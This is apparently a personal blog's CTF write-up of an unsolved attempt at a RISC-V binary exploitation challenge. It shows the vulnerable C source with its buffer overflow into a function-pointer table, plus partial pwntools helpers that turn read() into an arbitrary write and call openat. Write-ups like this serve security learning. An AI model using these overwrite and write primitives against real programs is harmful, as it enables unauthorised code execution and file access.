<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title> | papichulo16</title>
  <link rel="stylesheet" href="/assets/css/style.css">
  
</head>
<body>
  <nav class="navbar">
    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>

    <div class="nav-right">
      <a href="https://github.com/papichulo16">Github</a>
      <a href="/contact">Contact</a>
      <a href="/reviews">Reviews</a>
      <div class="dropdown">
        <span><a href="/projects">Projects ▾</a></span>
        <div class="dropdown-content">
          
            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
          
            <a href="/projects/2_crap.html">C.R.A.P</a>
          
            <a href="/projects/6_ctf_writeups.html">PWN Writeups</a>
          
        </div>
      </div>
    </div>
  </nav>
  <hr>

  <main>
    <article class="post">

  <header class="post-header">
    <h1 class="post-title"></h1>
  </header>

  <div class="post-content">
    <p>I worked on this challenge for the entirety of the CTF. I mean I took a break from it for a little to do all of the beginner-pwn challenges so I could have at least contributed, but this was the real challenge I worked on. And to be honest, even though I didn’t solve it after over 20 hours of working on it, I definitely learned a lot.</p>

<p>Lets start by running checksec and file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] '/home/papichulo/Desktop/ExploitDev/LiveCTF/BuckeyeCTF/spaceman-chal/spaceman'
    Arch:       riscv64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
    Stripped:   No
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>spaceman: ELF 64-bit LSB executable, UCB RISC-V, RVC, double-float ABI, version 1 (SYSV), statically linked, for GNU/Linux 4.15.0, with debug_info, not stripped
</code></pre></div></div>

<p>First of all, this challenge is very unique with the fact that this runs on the <code class="language-plaintext highlighter-rouge">RISC-V</code> architecture, which changes things up quite a bit. Also not just that, but the challenge is statically linked and it never calls system, so anything ret2libc/one_gadget related is out of the window (not that one gadget would have even worked because this is a different architecture).</p>

<p>Also before starting, I had to find out how to debug the program since it runs on a different architecture and GDB would crap itself. Anyways what I did is that I had to run the binary in QEMU and send it into a localhost port, and then send a gdb script to that port like so.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">gdb</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">"spaceman"</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s">"file </span><span class="si">{</span><span class="n">binary</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"set architecture riscv:rv64"</span><span class="p">)</span>
<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"target remote localhost:1234"</span><span class="p">)</span>
</code></pre></div></div>

<p>Anyways, looking at the program, the bug is here.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mi">6</span>   <span class="err">│</span> <span class="err">#</span><span class="n">define</span> <span class="n">CMD_SIZE</span> <span class="mh">0x10</span>
   <span class="mi">7</span>   <span class="err">│</span> 
   <span class="mi">8</span>   <span class="err">│</span> <span class="kt">char</span> <span class="n">CMD_BUF</span><span class="p">[</span><span class="n">CMD_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
   <span class="mi">9</span>   <span class="err">│</span> 
  <span class="mi">10</span>   <span class="err">│</span> <span class="kt">void</span> <span class="nf">handle_echo</span><span class="p">();</span>
  <span class="mi">11</span>   <span class="err">│</span> <span class="kt">void</span> <span class="nf">handle_dish</span><span class="p">();</span>
  <span class="mi">12</span>   <span class="err">│</span> <span class="kt">void</span> <span class="nf">handle_engines</span><span class="p">();</span>
  <span class="mi">13</span>   <span class="err">│</span> <span class="kt">void</span> <span class="nf">handle_shields</span><span class="p">();</span>
  <span class="mi">14</span>   <span class="err">│</span> <span class="kt">void</span> <span class="nf">handle_status</span><span class="p">();</span>
  <span class="mi">15</span>   <span class="err">│</span> <span class="kt">void</span> <span class="nf">handle_help</span><span class="p">();</span>
  <span class="mi">16</span>   <span class="err">│</span> 
  <span class="mi">17</span>   <span class="err">│</span> <span class="k">struct</span> <span class="p">{</span>
  <span class="mi">18</span>   <span class="err">│</span>     <span class="kt">char</span> <span class="o">*</span><span class="n">cmdName</span><span class="p">;</span>
  <span class="mi">19</span>   <span class="err">│</span>     <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">handler</span><span class="p">)();</span>
  <span class="mi">20</span>   <span class="err">│</span> <span class="p">}</span> <span class="n">CMD_HANDLERS</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mi">21</span>   <span class="err">│</span>     <span class="s">"help"</span><span class="p">,</span> <span class="n">handle_help</span><span class="p">,</span>
  <span class="mi">22</span>   <span class="err">│</span>     <span class="s">"echo"</span><span class="p">,</span> <span class="n">handle_echo</span><span class="p">,</span>
  <span class="mi">23</span>   <span class="err">│</span>     <span class="s">"dish"</span><span class="p">,</span> <span class="n">handle_dish</span><span class="p">,</span>
  <span class="mi">24</span>   <span class="err">│</span>     <span class="s">"engines"</span><span class="p">,</span> <span class="n">handle_engines</span><span class="p">,</span>
  <span class="mi">25</span>   <span class="err">│</span>     <span class="s">"shields"</span><span class="p">,</span> <span class="n">handle_shields</span><span class="p">,</span>
  <span class="mi">26</span>   <span class="err">│</span>     <span class="s">"status"</span><span class="p">,</span> <span class="n">handle_status</span><span class="p">,</span>
  <span class="mi">27</span>   <span class="err">│</span> <span class="p">};</span>
  <span class="mi">28</span>   <span class="err">│</span> 
  <span class="mi">29</span>   <span class="err">│</span> <span class="kt">void</span> <span class="nf">get_command</span><span class="p">()</span> <span class="p">{</span>
  <span class="mi">30</span>   <span class="err">│</span>     <span class="n">memset</span><span class="p">(</span><span class="n">CMD_BUF</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">CMD_SIZE</span><span class="p">);</span>
  <span class="mi">31</span>   <span class="err">│</span>     <span class="n">printf</span><span class="p">(</span><span class="s">"COMMAND&gt; "</span><span class="p">);</span>
  <span class="mi">32</span>   <span class="err">│</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">CMD_BUF</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span> <span class="p">{</span>
  <span class="mi">33</span>   <span class="err">│</span>         <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="mi">34</span>   <span class="err">│</span>     <span class="p">}</span>
</code></pre></div></div>

<p>So the program creates a <code class="language-plaintext highlighter-rouge">0x10</code> sized chunk but then the <code class="language-plaintext highlighter-rouge">fgets()</code> call tries to put <code class="language-plaintext highlighter-rouge">0x20</code> bytes into the buffer, overwriting the first struct in <code class="language-plaintext highlighter-rouge">CMD_HANDLERS[]</code>. This means that overwriting <code class="language-plaintext highlighter-rouge">handle_help</code> with an address of our choice will let us run whatever function we want, and because the program is statically linked with <code class="language-plaintext highlighter-rouge">fnoPIE</code>, we will not need any leaks. Also, what I realized was that the registers at the time of calling the <code class="language-plaintext highlighter-rouge">handle</code> functions will be as goes: <code class="language-plaintext highlighter-rouge">a0</code> will always equal 0, <code class="language-plaintext highlighter-rouge">a1</code> is the string of our command in hex form, and <code class="language-plaintext highlighter-rouge">a2</code> will be the length of the command.</p>

<p>Now with this in mind, my <a href="https://github.com/SolarDebris">friend</a> found that we can call <code class="language-plaintext highlighter-rouge">read()</code> on any address and whatever we put in <code class="language-plaintext highlighter-rouge">stdin</code> next, will be written there. The only problem is that the address is technically 3 bytes long (since there will be null bytes after that) and then because of that, we only overwrite 3 bytes at a time.</p>

<p>So what I thought of doing was, finding a pointer whose value points to the address of another pointer, whose value points to the address of another pointer, whose value points to the address that we want to modify. And after a little while of looking for that in Ghidra, I finally found it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x8a488 =&gt; 0x8a2b8 =&gt; 0x8a518 =&gt; writeable memory
</code></pre></div></div>

<p>With this in mind, I created some helper functions. At the time when I tested it I accidentally ended the address in <code class="language-plaintext highlighter-rouge">b</code> insted of <code class="language-plaintext highlighter-rouge">8</code> so I thought there was something wrong with my function and I kind of made it a little boofed, but it worked and I was mostly busy on trying to get the flag and not on how well I made my functions. Anyways here they are:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">write_three_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span> 
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"read"</span><span class="p">])</span> <span class="c1"># make look up table point to anywhere
</span>    
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="s">"COMMAND&gt;"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="s">"COMMAND&gt;"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>

    <span class="n">sl</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    
<span class="k">def</span> <span class="nf">write_data</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">pp_addr</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="c1"># for some reason the function is being weird
</span>    <span class="c1"># so instead of fixing it I am just gonna add something to cope with it
</span>    <span class="c1"># spoken like a true programmer
</span>    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"AAA</span><span class="se">\x00\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">data</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">3</span><span class="p">:</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="mi">3</span><span class="p">])</span>
        <span class="n">write_three_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">3</span><span class="p">:</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="mi">4</span><span class="p">])</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">3</span>

        <span class="n">write_three_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">pp_addr</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>

</code></pre></div></div>

<p>After that, what we tried to do was write the address of the flag into memory and then call the <code class="language-plaintext highlighter-rouge">open_at()</code> function because the <code class="language-plaintext highlighter-rouge">param_2</code> is what is the char pointer.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">open_at</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">p_addr</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"openat"</span><span class="p">])</span> <span class="c1"># make look up table point to anywhere
</span>    
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="s">"COMMAND&gt;"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="s">"COMMAND&gt;"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</code></pre></div></div>

<p>After this we kind of got stuck, then what my friend thought to do was to start a ROP chain so that is what we did. Only problem is that ROP in RISC-V kind of sucks. For some reason, <code class="language-plaintext highlighter-rouge">ropper</code> won’t even try to find gadgets and also, <code class="language-plaintext highlighter-rouge">ROPgadget</code> will not ever give us a <code class="language-plaintext highlighter-rouge">ret</code>, so after reading up a bit, I found that <code class="language-plaintext highlighter-rouge">c.jr ra</code> is the equivalent. So with that in mind, we started trying to construct ROP chains for the next few hours, and even got an <a href="https://github.com/Pwnut">extra hand</a>.</p>

<p>This is where we got stumped, we tried a lot of things but none of them worked. One good thing that did come out of this though is that I started getting more and more comfortable reading a RISC-V manual throughout the process and started to learn a lot about the architecture.</p>

<p>In the end, we were in the right path to the intended solution. We just needed more time to keep looking at ROP gadgets and to find what the author called, <code class="language-plaintext highlighter-rouge">the magic gadget</code>.</p>

<p>EDIT: turns out ROPgadget did not even show us the gadget we needed. I actually am so pissed off about that now, this sucks.
EDIT 2: I found out how to find it, I had to go through and run <code class="language-plaintext highlighter-rouge">objdump</code> on the binary and then grepped for the specific gadgets. This is so tragic.</p>

<p>One thing that I did find interesting though, was a specific person’s solve. His username on Discord was <code class="language-plaintext highlighter-rouge">lobob-rondo</code> and he said what he did was and I quote “leak stack, call <code class="language-plaintext highlighter-rouge">__nptl_change_stack_perm</code> to make stack executable and shellcode”. So what I found interesting was that, first ofall, you can leak the stack through <code class="language-plaintext highlighter-rouge">libc_environ</code>. But most importantly, THERE IS A FUNCTION THAT WILL CHANGE THE STACK TO BE EXECUTABLE!!!! LIKE WHAT????? WHY IS THAT THERE???????</p>

<p>Anyways that is a good thing to know for future CTFs. This challenge was very fun and I got quite a bit out of it. Overall great challenge!!!!</p>


  </div>

</article>

  </main>

  <footer>
    <hr>
    © 2025 papichulo16
  </footer>
</body>
</html>

